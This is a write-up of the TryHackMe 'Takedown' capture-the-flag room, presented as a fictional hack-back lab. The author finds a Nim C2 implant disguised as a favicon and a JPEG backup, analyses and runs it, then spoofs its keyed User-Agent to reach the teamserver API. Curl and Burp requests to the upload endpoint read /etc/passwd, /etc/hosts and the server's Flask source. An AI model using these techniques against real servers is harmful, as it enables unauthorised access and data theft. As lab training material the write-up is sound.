# Takedown — Writeup

## Overview
### Takedown — Writeup
### Takedown — Writeup
----
We have reason to believe a corporate webserver has been compromised by RISOTTO GROUP. Cyber interdiction is authorized for this operation. Find their teamserver and take it down.
----
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b6cc9563554d62c4c3e5fb1eaa1be238.png)
Download Task Files
(AUTHOR'S NOTE: This THM room should be treated as a work of fiction. The author of this room does not condone unauthorized hacking of anything for any reason. Hacking back is a crime.)
**IMPORTANT:** Make sure to add the IP address as `takedown.thm.local` to your `/etc/hosts` file.
Good morning, operator! The Commanding Officer is very excited about this mission. The mission brief is ready for you.
Click "Download Task Files" to download the mission brief. Read it carefully!
When you are ready, proceed with the operation.
Answer the questions below
Ready!
Completed
### Task 2  Start VM
Start Machine
VM IP: MACHINE_IP
REMINDER: Make sure to add the IP address as `takedown.thm.local` to your `/etc/hosts` file.
**Note:** This VM may take about 5-8 minutes to fully initialize. A basic Nmap scan (`nmap -sC -sV takedown.thm.local`) should indicate two open ports.
Answer the questions below
VM Started
Completed
### Task 3  User.txt
Enter the value of user.txt
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~]
└─$ tac /etc/hosts
10.10.191.181 takedown.thm.local

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sC -sV takedown.thm.local
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for takedown.thm.local (10.10.191.181)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d55623c602eb61c5fb4aefa0aa4a94f (RSA)
|   256 f1b59a77c6aa390cb0b5eb53994b87dc (ECDSA)
|_  256 0dfbe49c01495d46c35d4e9926e44596 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
| http-robots.txt: 1 disallowed entry 
|_/favicon.ico
|_http-title: Infinity
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.69 seconds

XML Parsing Error: no root element found
Location: http://takedown.thm.local/inc/sendEmail.php
Line Number 9, Column 3:

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://takedown.thm.local/ -w /usr/share/wordlists/dirb/common.txt -x txt             
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://takedown.thm.local/.htaccess.txt        (Status: 403) [Size: 283]
http://takedown.thm.local/.htpasswd.txt        (Status: 403) [Size: 283]
http://takedown.thm.local/.htpasswd            (Status: 403) [Size: 283]
http://takedown.thm.local/.hta                 (Status: 403) [Size: 283]
http://takedown.thm.local/.hta.txt             (Status: 403) [Size: 283]
http://takedown.thm.local/.htaccess            (Status: 403) [Size: 283]
http://takedown.thm.local/css                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/css/]
http://takedown.thm.local/fonts                (Status: 301) [Size: 324] [--> http://takedown.thm.local/fonts/]
http://takedown.thm.local/favicon.ico          (Status: 200) [Size: 605010]
http://takedown.thm.local/images               (Status: 301) [Size: 325] [--> http://takedown.thm.local/images/]
http://takedown.thm.local/inc                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/inc/]
http://takedown.thm.local/index.html           (Status: 200) [Size: 25844]
http://takedown.thm.local/js                   (Status: 301) [Size: 321] [--> http://takedown.thm.local/js/]
http://takedown.thm.local/readme.txt           (Status: 200) [Size: 4763]
http://takedown.thm.local/robots.txt           (Status: 200) [Size: 36]
http://takedown.thm.local/robots.txt           (Status: 200) [Size: 36]
http://takedown.thm.local/server-status        (Status: 403) [Size: 283]
Progress: 9210 / 9230 (99.78%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~]
└─$ wget http://takedown.thm.local/favicon.ico
--  http://takedown.thm.local/favicon.ico
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 605010 (591K) [image/vnd.microsoft.icon]
Saving to: ‘favicon.ico’

favicon.ico          100%[======================>] 590.83K   241KB/s    in 2.4s    

(241 KB/s) - ‘favicon.ico’ saved [605010/605010]

                                                                                    
┌──(witty㉿kali)-[~]
└─$ wget http://takedown.thm.local/images/shutterbug.jpg
--  http://takedown.thm.local/images/shutterbug.jpg
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 133977 (131K) [image/jpeg]
Saving to: ‘shutterbug.jpg’

shutterbug.jpg       100%[======================>] 130.84K   161KB/s    in 0.8s    

(161 KB/s) - ‘shutterbug.jpg’ saved [133977/133977]

                                                                                    
┌──(witty㉿kali)-[~]
└─$ ls                         
buffer_overflow                                  go
bug_hunter                                       GrayHacking
burp-hash.sqlite                                 Music
cct2019.rep                                      Pictures
clean.sh                                         Programacion
corgo2.jpg                                       Public
Desktop                                          puppos.jpeg
Dockerfile                                       shell-witty.jpeg.php
Documents                                        shell-witty.jpeg.php_original
Downloads                                        shutterbug.jpg
favicon.ico                                      Templates
ferox-http_10_10_230_190:8080_-1678482349.state  test2-witty.jpeg.php
ferox-http_10_10_230_190:8080_-1678482581.state  test2-witty.jpeg.php_original
ferox-http_10_10_230_190:8080_-1678483133.state  testing.gpr
fin1.py                                          testing.rep
fin2.py                                          test-witty.jpeg.php_original
fin3.py                                          threadfix-cli.log
final.py                                         Videos
                                                                                    
┌──(witty㉿kali)-[~]
└─$ cd Downloads                             
                                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ mv shutterbug.jpg.bak ..   

basic static analysis

┌──(witty㉿kali)-[~]
└─$ file favicon.ico && file shutterbug.jpg*
favicon.ico: PE32+ executable (GUI) x86-64, for MS Windows, 17 sections
shutterbug.jpg:     JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1050x700, components 3
shutterbug.jpg.bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e3c7f037a52f26b1982f131013708f59786d773, for GNU/Linux 3.2.0, not stripped

┌──(witty㉿kali)-[~]
└─$ sha256sum favicon.ico && sha256sum shutterbug.jpg*
80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc  favicon.ico
0a6583131935af7ad7b527d86af6372c4ca9d7ff74f55a3f25a3d1c2a41e891f  shutterbug.jpg
265d515fbe1e8e19da9adeabebb4e197e2739dad60d38511d5d23de4fbcf3970  shutterbug.jpg.bak

┌──(witty㉿kali)-[~]
└─$ strings -n 6 favicon.ico | grep nim
fatal.nim
io.nim
fatal.nim
parseutils.nim
strutils.nim
@strutils.nim(739, 11) `sep.len > 0` 
oserr.nim
os.nim

                                                                                                      
┌──(witty㉿kali)-[~]
└─$ strings -n 6 favicon.ico > malware_analysys

@[*] Sleeping: 10000
@results
@[*] Result: 
@[x] Error: 
@Error
@/download
@Could not read file: 
@[x] Download args: download [agent source] [server destination]
[*] For example: download C:\Windows\Temp\foo.exe /home/kali/foo.exe
@http://takedown.thm.local/
@File written!
@[+] Downloaded 
@/upload
@/api/agents/
@ from C2 server
@[*] Ready to receive 
@[x] Upload args: upload [server source] [agent destination]
[*] For example: upload foo.exe C:\Windows\Temp\foo.exe
@Error: 
@exec 
@get_hostname
@download
@upload
@[*] Command to run: 
@/command
@http://takedown.thm.local/api/agents/
@[*] Checking for command...
@[*] Hostname: 
@[*] My UID is: 
@http://takedown.thm.local/api/agents/register
@Authorization
@httpclient.nim(1144, 15) `false` 
@Transfer-Encoding
@Content-Length
@httpclient.nim(1082, 13) `not url.contains({'\r', '\n'})` url shouldn't contain any newline characters
@application/json
@Content-Type
@Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
@random.nim(325, 10) `x.a <= x.b` 
@hostname
@[*] Key matches!
@c.oberst
@whoami
@[*] Checking keyed username...
@[*] Drone ready!
@{prog}
Usage:
   [options] 
Options:
  -h, --help
  -v, --ver
@iterators.nim(240, 11) `len(a) == L` the length of the seq changed while iterating over it
@Unknown argument(s): 
@argparse_help
@ShortCircuit on 
@--ver
@--help
@Can't obtain a value from a `none`
Unknown error
Argument domain error (DOMAIN)
Overflow range error (OVERFLOW)
Partial loss of significance (PLOSS)
Total loss of significance (TLOSS)
The result is too small to be represented (UNDERFLOW)
Argument singularity (SIGN)
_matherr(): %s in %s(%g, %g)  (retval=%g)
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdata

┌──(witty㉿kali)-[~]
└─$ curl http://takedown.thm.local/api/agents 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80</address>
</body></html>

A potential username, `c.oberst` and a string indicating that a key has matched.

Revisiting the Intel Brief, environmental keying is noted as a tactic used by Risotto Group:

advanced static analysis of favicon.ico

┌──(witty㉿kali)-[~]
└─$ cutter favicon.ico 

or ghidra

Nim programs are a little weird. Usually, there is an entrypoint that leads to main(), which leads to another function called NimMain(), which leads to another function called NimMainModule(), which leads to the actual start of the program. If the program is running in Windows, there’s yet another function call for WinMain().

Basically, Nim has a few wrapper functions around the true main() method of a program. So we need to peel back some layers.

From main(), we trace into NimMain():

┌──(witty㉿kali)-[~]
└─$ chmod +x shutterbug.jpg.bak 
                                                                                                      
┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak             
🥺🥺😢😢😢😭😭😭😂😂🤣🤣

┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak -h
😂🐍🚀🚀🤫🎇🎇🎆🙏🔥❤️‍🔥💖💯👋👋👋💯❤️‍🔥💖🔥🔥🔥❤️‍🔥🤫🎇🎇🎆🎆🚀🍆

Usage:
   [options] 

Options:
  -h, --help
  -v, --ver

┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
🥺🥺😢😢😢😭😭😭😂😂🤣🤣

──(witty㉿kali)-[~]
└─$ sudo useradd -m c.oberst

┌──(witty㉿kali)-[~]
└─$ sudo su c.oberst

┌──(witty㉿kali)-[/home/c.oberst]
└─$ sudo su c.oberst
```
```text
$ ls
```
```text
$ wget http://takedown.thm.local/images/shutterbug.jpg.bak
--  http://takedown.thm.local/images/shutterbug.jpg.bak
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 333120 (325K) [application/x-trash]
Saving to: ‘shutterbug.jpg.bak’

shutterbug.jpg.bak        100%[===================================>] 325.31K   224KB/s    in 1.5s    

(224 KB/s) - ‘shutterbug.jpg.bak’ saved [333120/333120]
```
```text
$ chmod +x shutterbug.jpg.bak
```
```text
$ ./shutterbug.jpg.bak
-v
^CSIGINT: Interrupted by Ctrl-C.
```
```text
$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
[*] Key matches!
[*] My UID is: qemm-pciq-dxux-skng
[*] Hostname: kali
[*] Checking for command...
[*] Command to run: id
[*] Result: uid=1002(c.oberst) gid=1002(c.oberst) groups=1002(c.oberst)
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: pwd
[*] Result: /home/c.oberst
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: id
[*] Result: uid=1002(c.oberst) gid=1002(c.oberst) groups=1002(c.oberst)
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: whoami
[*] Result: c.oberst
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
oserr.nim(95)            raiseOSError
Error: unhandled exception: Connection refused [OSError]

using wireshark

GET /api/agents/pbgd-ovbw-xkub-wznl/command HTTP/1.1
Host: takedown.thm.local
Connection: Keep-Alive
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

HTTP/1.1 405 Method Not Allowed
Server: WebSockify Python/3.6.9
Date: Fri, 30 Jun 2023 20:49:44 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 472

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 405</p>
        <p>Message: Method Not Allowed.</p>
        <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
    </body>
</html>

──(witty㉿kali)-[/home/c.oberst]
└─$ sudo su c.oberst
```
```text
$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
[*] Key matches!
[*] My UID is: pbgd-ovbw-xkub-wznl
[*] Hostname: kali
[*] Checking for command...
[*] Command to run: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 405</p>
        <p>Message: Method Not Allowed.</p>
        <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
    </body>
</html>

[*] Result: 
[*] Sleeping: 10000

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local           
.   

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'ilcn-qlob-ycju-wovt': 'www-infinity'}   

┌──(witty㉿kali)-[/home/c.oberst]
└─$ gobuster dir --url=http://takedown.thm.local/api --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" --exclude-length 1
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1
[+] User Agent:              Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server               (Status: 200) [Size: 71]
/agents               (Status: 200) [Size: 39]

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/server
{"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}                                                               
┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'ilcn-qlob-ycju-wovt': 'www-infinity'}  

If we go back to our running agent on our malware analysis machine, we can observe the live agent running commands. One of these commands is the `upload bar.txt foo.txt` 

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/ilcn-qlob-ycju-wovt/upload -H "Content-Type: application/json" -d '{"file":"/etc/passwd"}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

using burpsuite

GET /api/agents HTTP/1.1

Host: takedown.thm.local

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:36:21 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 70

Connection: close

Access-Control-Allow-Origin: *

{'ilcn-qlob-ycju-wovt': 'www-infinity', 'lwdb-sdse-wgkb-nuan': 'kali'}

REQUEST

GET /api/agents/commands HTTP/1.1

Host: takedown.thm.local

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

RESPONSE

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:34:01 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 201

Connection: close

Access-Control-Allow-Origin: *

Available Commands: ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', 'get_hostname']

POST /api/agents/ilcn-qlob-ycju-wovt/upload HTTP/1.1

Host: takedown.thm.local

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.5

Connection: close

Content-Type: application/json

Content-Length: 27

{"file":"/etc/hosts"

}

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:53:48 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 173

Connection: close

Access-Control-Allow-Origin: *

127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.7	c2-shrike-1

┌──(c.oberst㉿kali)-[~]
└─$ curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/ilcn-qlob-ycju-wovt/upload -H "Content-Type: application/json" -d '{"file":"app.py"}'
import logging
import sys
import json
from threading import Thread
import re
import random
from os import system

import flask
from flask import request, abort
from flask_cors import CORS

HEADER_KEY = "z.5.x.2.l.8.y.5"

command_list = []
command_to_execute_next = ""
command_stack_reset_flag = False
agg_commands = open('aggressor.txt', 'r')
lines = agg_commands.readlines()
for line in lines:
    command_list.append(line.strip())

available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]

live_agents = {}

app = flask.Flask(__name__)
app.secret_key = "000011112222333344445555666677778888"

logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)

def is_user_agent_keyed(user_agent):
    return HEADER_KEY in user_agent

def json_response(app, data):
    try:
        return app.response_class(
            response=json.dumps(data),
            status=200,
            mimetype='application/json'
        )
    except Exception as e:
        return str(e)

def is_command_reset_flag_set(command_stack_reset_flag):
    return command_stack_reset_flag

@app.route("/")
def hello_world():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return "."
    else:
        abort(404)
